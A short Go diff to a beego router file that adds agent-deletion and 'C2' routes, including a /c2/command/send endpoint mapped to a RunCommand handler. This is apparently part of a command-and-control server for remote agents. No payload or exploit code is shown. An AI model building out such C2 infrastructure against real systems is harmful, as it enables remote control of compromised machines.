@@ -14,6 +14,10 @@ func init() {
 
 	// Database endpoints
 	beego.Router("/db/agents", &controllers.APIController{}, "get:Agents")
-	beego.Router("/db/delete", &controllers.APIController{}, "get:ClearAll")
+	beego.Router("/db/clear", &controllers.APIController{}, "get:ClearAll")
+	beego.Router("/db/delete", &controllers.APIController{}, "post:Del_Agent")
+
+	// C2 endpoints
+	beego.Router("/c2/command/send", &controllers.APIController{}, "post:RunCommand")
 
 }
